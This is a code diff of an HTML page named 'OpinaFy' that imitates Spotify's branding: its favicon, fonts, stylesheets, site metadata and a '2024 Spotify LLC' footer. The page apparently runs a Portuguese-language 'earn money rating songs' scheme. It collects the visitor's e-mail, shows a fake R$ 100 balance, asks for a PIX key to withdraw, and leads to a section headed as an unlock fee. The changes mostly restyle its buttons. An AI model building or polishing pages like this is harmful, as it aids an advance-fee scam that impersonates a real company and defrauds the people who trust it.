@@ -10,11 +10,17 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500&amp;display=swap" rel="stylesheet">
+   <link rel="icon" href="https://open.spotifycdn.com/cdn/images/favicon.0f31d2ea.ico" />
   <link rel="stylesheet" href="css/styles.css">
   <script src="js/jquery-3.6.4.min.js"></script>
   <script src="js/js.cookie.min.js"></script>
   </head><body><audio id="meuAudio"><source src="media/dinheiro.mp3" type="audio/mp3"></audio>
   
+     <meta charset="utf-8" />
+    <title>OpinaFy</title>
+    <meta property="og:site_name" content="Spotify" />
+    <meta property="fb:app_id" content="174829003346" />
+	<link rel="icon" href="https://open.spotifycdn.com/cdn/images/favicon.0f31d2ea.ico" />
   
       <!-- Favicon -->
     <link rel="icon" sizes="32x32" type="image/png" href="https://open.spotifycdn.com/cdn/images/favicon32.b64ecc03.png" />
@@ -32,23 +38,24 @@
     <link rel="preload" href="https://encore.scdn.co/fonts/SpotifyMixUI-Bold-4264b799009b1db5c491778b1bc8e5b7.woff2" as="font" type="font/woff2" crossorigin="anonymous" />
     <link rel="preload" href="https://encore.scdn.co/fonts/SpotifyMixUITitle-Extrabold-ba6c73cd7f82c81e49cf2204017803ed.woff2" as="font" type="font/woff2" crossorigin="anonymous" />
 
-
-
     <!-- Stylesheet -->
-    <link rel="stylesheet" href="https://open.spotifycdn.com/cdn/build/error-page/error-page.167c5854.css" />
+  <link rel="stylesheet" href="https://open.spotifycdn.com/cdn/build/error-page/error-page.167c5854.css" />
+  <link rel="stylesheet" href="https://open.spotifycdn.com/cdn/build/error-page/error-page.167c5854.css" />
 	<link rel="preload" href="https://support.scdn.co/web/_next/static/css/25f6d47778c0f346.css" as="style">
+	<link rel="stylesheet" href="https://support.scdn.co/web/_next/static/css/25f6d47778c0f346.css" data-n-g="">
 	<link rel="stylesheet" href="https://support.scdn.co/web/_next/static/css/25f6d47778c0f346.css" data-n-g="">
     <!-- Scripts -->
     <script defer src="https://www.googleoptimize.com/optimize.js?id=GTM-W53X654"></script>
     <script defer src="https://open.spotifycdn.com/cdn/js/gtm.ea4c34bc.js"></script>
     <script defer src="https://open.spotifycdn.com/cdn/js/retargeting-pixels.5ab9cdc0.js"></script>
-</head>
-  
 
 
   
   <!--------------------- Pagina de login" --------------------->
   
+  <style>
+  .primary{background-color:var(--background-highlight,#3be477);}/*!sc*/
+  </style>
   
   <div id="login" style="display: block; ">
         
@@ -57,22 +64,21 @@
         <div class="outer-box-login">
           <div class="white-box-login">
             <img src="images/opinilogo.png" style="width:70%; margin: 0 auto; display: flex;">
-            <p class="content" style="text-align: center; color: rgb(999, 999, 999); font-weight: bold; font-size: 18px;">Bem-vindo(a) ao OpinaFy</p>
-            <p class="content"> <p> Insira seu e-mail para prosseguir! </p>
+            <p class="popup-textL" style="text-align: center; color: rgb(999, 999, 999); font-weight: bold; font-size: 18px;">Bem-vindo(a) ao OpinaFy</p>
+            <p class="popup-textL" style="text-align: center; color: rgb(999, 999, 999); font-size: 15px;">Insira seu e-mail para prosseguir!</p>
             
             <input for="email" type="text" name="email" id="email" class="form-input" style="margin-top:20px;" placeholder="E-mail" oninput="validateEmail()">
-            <a class="primary" id="prosseguir-button" style="margin-top: 15px;" onclick="verificarCampos()" href="#" >ENTRAR</a>
+            <a class="primary" id="prosseguir-button" style="margin-top: 15px;" onclick="verificarCampos()" href="#">ENTRAR</a>
                 
             <div style="margin-bottom: 10px;"></div>
-			
-		   
+                
 
                
           </div>  
         </div>
     
 
-        <div class="footer>
+        <div class="footer">
           <p style="text-align: center; color: rgb(999, 999, 999); font-size: 15px; margin-top: 30px; font-weight: bold;">2024 Spotify LLC</p>
           <p style="text-align: center; color: rgb(999, 999, 999); font-size: 14px; margin-top: -10px; margin-bottom: 0px;">Termos e Politica de Privacidade</p>
         </div>
@@ -80,9 +86,6 @@
 
 
   </div>
-  
-  
-  
 
 
 
@@ -95,7 +98,7 @@
           </a>
           <div style="width: 45%;" class="buttons-container" href="#" onclick="mostrarPagina('saque')">
             <div class="valor-box">
-              <span id="valor" style="font-family: 'Montserrat', sans-serif; max-width: 100%;">R$ 100.00</span>
+              <span id="valor" style="sans-serif; max-width: 100%;">R$ 100.00</span>
             </div>
           </div>
         </div>
@@ -136,9 +139,10 @@
             <button class="rating-button" data-rating="1">-18 anos</button>
             <button class="rating-button" data-rating="2">+18 anos</button>
           </div>
+<br><br>           
+          <a type="button" class="primary" id="B1" onclick="showLoadingB1();">Enviar respostas</a>
+<br><br><br><br>
               
-          <button type="button" class="enviarCodigo" id="B1" onclick="showLoadingB1();">Enviar respostas</button>
-			<br>
       </div>
     </div>
     
@@ -190,9 +194,9 @@
           <button class="rating-button" data-rating="1">-18 anos</button>
           <button class="rating-button" data-rating="2">+18 anos</button>
         </div>
-            
-        <button type="button" class="enviarCodigo" id="B2" onclick="showLoadingB2();">Enviar respostas</button>
-<br>
+         <br><br>   
+        <a type="button" class="primary" id="B2" onclick="showLoadingB2();">Enviar respostas</a>
+<br><br><br><br>
               
       </div>
     </div>
@@ -246,10 +250,10 @@
             <button class="rating-button" data-rating="1">-18 anos</button>
             <button class="rating-button" data-rating="2">+18 anos</button>
           </div>
-              
-          <button type="button" class="enviarCodigo" id="B3" onclick="showLoadingB3();">Enviar respostas</button>
-  <br>
-            
+            <br><br>  
+          <a type="button" class="primary" id="B3" onclick="showLoadingB3();">Enviar respostas</a>
+  
+        <br><br><br><br>   
         </div>
       </div>
         
@@ -303,10 +307,10 @@
             <button class="rating-button" data-rating="1">-18 anos</button>
             <button class="rating-button" data-rating="2">+18 anos</button>
           </div>
-              
-          <button type="button" class="enviarCodigo" id="B4" onclick="showLoadingB4();">Enviar respostas</button>
-  
- <br>           
+            <br><br>  
+          <a type="button" class="primary" id="B4" onclick="showLoadingB4();">Enviar respostas</a>
+ 
+           <br><br><br><br>
         </div>
       </div>
         
@@ -359,10 +363,10 @@
             <button class="rating-button" data-rating="1">-18 anos</button>
             <button class="rating-button" data-rating="2">+18 anos</button>
           </div>
-              
-          <button type="button" class="enviarCodigo" id="B5" onclick="showLoadingB5();">Enviar respostas</button>
-  <br>
-            
+           <br><br>   
+          <a type="button" class="primary" id="B5" onclick="showLoadingB5();">Enviar respostas</a>
+  
+        <br><br><br><br>    
         </div>
       </div> 
         
@@ -413,10 +417,10 @@
             <button class="rating-button" data-rating="1">-18 anos</button>
             <button class="rating-button" data-rating="2">+18 anos</button>
           </div>
-              
-          <button type="button" class="enviarCodigo" id="B6" onclick="showLoadingB6();">Enviar respostas</button>
-  <br>
-            
+            <br><br>  
+          <a type="button" class="primary" id="B6" onclick="showLoadingB6();">Enviar respostas</a>
+  
+        <br><br><br><br>    
         </div>
       </div>
         
@@ -468,10 +472,10 @@
             <button class="rating-button" data-rating="1">-18 anos</button>
             <button class="rating-button" data-rating="2">+18 anos</button>
           </div>
-              
-          <button type="button" class="enviarCodigo" id="B7" onclick="showLoadingB7();">Enviar respostas</button>
+           <br><br>   
+          <a type="button" class="primary" id="B7" onclick="showLoadingB7();">Enviar respostas</a>
   
-            <br>
+         <br><br><br><br>   
         </div>
       </div>  
         
@@ -524,10 +528,10 @@
             <button class="rating-button" data-rating="1">-18 anos</button>
             <button class="rating-button" data-rating="2">+18 anos</button>
           </div>
-              
-          <button type="button" class="enviarCodigo" id="B8" onclick="showLoadingB8();">Enviar respostas</button>
-  <br>
-            
+            <br><br>  
+          <a type="button" class="primary" id="B8" onclick="showLoadingB8();">Enviar respostas</a>
+  
+        <br><br><br><br>    
         </div>
       </div> 
         
@@ -580,10 +584,10 @@
             <button class="rating-button" data-rating="1">-18 anos</button>
             <button class="rating-button" data-rating="2">+18 anos</button>
           </div>
-              
-          <button type="button" class="enviarCodigo" id="B9" onclick="showLoadingB9();">Enviar respostas</button>
-  <br>
-            
+            <br><br>  
+          <a type="button" class="primary" id="B9" onclick="showLoadingB9();">Enviar respostas</a>
+  
+        <br><br><br><br>    
         </div>
       </div> 
         
@@ -634,10 +638,10 @@
             <button class="rating-button" data-rating="1">-18 anos</button>
             <button class="rating-button" data-rating="2">+18 anos</button>
           </div>
-              
-          <button type="button" class="enviarCodigo" id="B10" onclick="showLoadingB10();">Enviar respostas</button>
-  <br>
-            
+           <br><br>   
+          <a type="button" class="primary" id="B10" onclick="showLoadingB10();">Enviar respostas</a>
+  
+        <br><br><br>    
         </div>
       </div> 
         
@@ -807,8 +811,9 @@
     <input class="form-input" type="text" name="chave-pix" id="chave-pix" placeholder="Digite sua chave PIX aqui">
 
     <input class="form-input" style="margin-top: 15px;" type="text" name="quantia" id="quantia" placeholder="Digite o valor que deseja sacar" inputmode="numeric" oninput="formatarValor(this)">
-    
-    <button class="desbloquear-button" onclick="showPopup()" style="font-weight: bold; font-size: 18x; border-radius: 12px; margin-top: 15px;">REALIZAR SAQUE</button>
+    <br>
+    <a class="primary" onclick="showPopup()">REALIZAR SAQUE</a>
+	<br>
   
   <!--------------------- TAXA DESBLOQUEIO --------------------->
     
